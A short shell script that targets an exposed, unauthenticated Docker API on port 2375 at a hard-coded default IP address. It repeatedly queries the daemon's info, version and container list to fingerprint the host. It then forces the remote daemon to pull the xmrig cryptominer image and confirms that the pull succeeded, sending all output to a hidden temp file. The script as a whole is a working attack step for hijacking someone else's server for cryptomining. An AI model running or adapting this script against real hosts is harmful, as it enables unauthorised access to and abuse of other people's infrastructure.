#!/bin/sh
# Is this endpoint a proxy with several backends? Repeat the same call and compare IDs.
ip=${1:-193.36.116.120}
exec > /tmp/_mb.out 2>&1
echo "ts=$(date -u) ip=$ip"
echo "-- /info Name+ID x6 (same call, repeated):"
i=0; while [ $i -lt 6 ]; do
    i=$((i + 1))
    curl -sS -m 8 "http://$ip:2375/info" | grep -o -e '"Name": *"[^"]*"' -e '"ID": *"[^"]*"' | tr '\n' ' '
    echo
    sleep 1
done
echo "-- /version x3:"
i=0; while [ $i -lt 3 ]; do
    i=$((i + 1))
    curl -sS -m 8 "http://$ip:2375/version" | grep -o -e '"Version":"[0-9.]*"' -e '"Name":"Docker[^"]*"' | tr '\n' ' '
    echo
done
echo "-- container list x3:"
i=0; while [ $i -lt 3 ]; do
    i=$((i + 1))
    curl -sS -m 8 "http://$ip:2375/containers/json?all=1" | grep -o '"/[A-Za-z0-9_.-]*"' | tr '\n' ' '
    echo
done
echo "-- force image pull then check:"
curl -sS -m 60 -X POST "http://$ip:2375/images/create?fromImage=xmrig%2Fxmrig&tag=latest" 2>&1 | tail -c 200; echo
sleep 3
echo "image_now=$(curl -sS -m 10 "http://$ip:2375/images/xmrig%2Fxmrig/json" 2>/dev/null | head -c 80)"
echo "list_now=$(curl -sS -m 8 "http://$ip:2375/containers/json?all=1" | grep -o '"/[A-Za-z0-9_.-]*"' | tr '\n' ' ')"
echo "done=$(date -u)"
